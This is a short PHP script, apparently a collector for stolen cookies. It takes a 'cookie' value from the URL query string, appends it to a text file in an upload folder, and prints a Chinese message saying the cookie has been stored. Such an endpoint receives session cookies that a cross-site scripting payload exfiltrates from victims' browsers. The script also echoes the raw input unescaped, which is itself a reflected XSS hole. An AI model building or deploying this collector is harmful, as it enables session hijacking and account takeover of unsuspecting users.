<?php
/**
 * Created by PhpStorm.
 * User: Junay
 * Date: 2017/7/21
 * Time: 23:21
 */
    $cook = isset($_GET['cookie'])?$_GET['cookie']:null;
    echo "你的COOKIE: ".$cook." 已储存<br>";
    $file = fopen('upload/ssss.txt','a+') or die('Unable to open file');
    fwrite($file,$cook);
    fclose($file);